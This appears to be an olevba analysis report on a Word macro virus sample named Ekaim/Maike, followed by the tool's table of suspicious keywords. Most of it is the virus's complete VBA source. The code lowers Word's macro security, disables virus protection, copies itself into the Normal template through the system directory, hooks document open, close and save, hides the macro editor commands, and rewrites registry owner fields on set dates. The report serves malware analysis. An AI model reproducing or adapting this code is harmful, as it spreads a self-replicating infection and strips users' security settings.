olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ekaim-0a6486cd6ed4235a862f09c943f2e66abf669667
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ekaim-0a6486cd6ed4235a862f09c943f2e66abf669667 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Maike.bas 
in file: Virus.MSWord.Ekaim-0a6486cd6ed4235a862f09c943f2e66abf669667 - OLE stream: 'Macros/VBA/Maike'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Dim sSysdir As String

Sub Maike()
On Error Resume Next

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 0&

Application.DisplayAlerts = wdAlertsNone
WordBasic.DisableAutoMacros = 0

Options.VirusProtection = False
Options.SaveNormalPrompt = False
 
 sSysdir = Space$(256)
 GetSystemDirectory sSysdir, Len(sSysdir)
 sSysdir = Left$(sSysdir, InStr(sSysdir, Chr$(0)) - 1)
 sSysdir = sSysdir + "\Maike.sys"

Application.VBE.ActiveVBProject.VBComponents("Maike").Export sSysdir

For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Maike" Then NormInstall = True
Next I

For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Maike" Then ActivInstall = True
Next I

If ActivInstall = True And NormInstall = False Then Set MIMI = NormalTemplate.VBProject _
Else If ActivInstall = False And NormInstall = True Then Set MIMI = ActiveDocument.VBProject
MIMI.VBComponents.Import (sSysdir)

If Day(Now()) = 1 Or Day(Now()) = 14 Or Day(Now()) = 28 Then Love

' This stupid Macro is coded from Vampir and many grezz to my friends and Maike the little good looking girl
'               VIRIINAME: MAIKE
End Sub

Sub Love()
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Maike you are": System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "the most beautiful": System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductId") = "girl in the world"
End Sub

Sub suppe()
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub


Sub FileSave()
    On Error Resume Next
    Call Maike
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Maike
End Sub

Sub AutoOpen()
    On Error Resume Next
    Call Maike
    Call suppe
End Sub

Sub AutoClose()
    On Error Resume Next
    Call Maike
End Sub

Sub ToolsMacro()
    On Error Resume Next
End Sub
Sub FileTemplates()
    On Error Resume Next
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

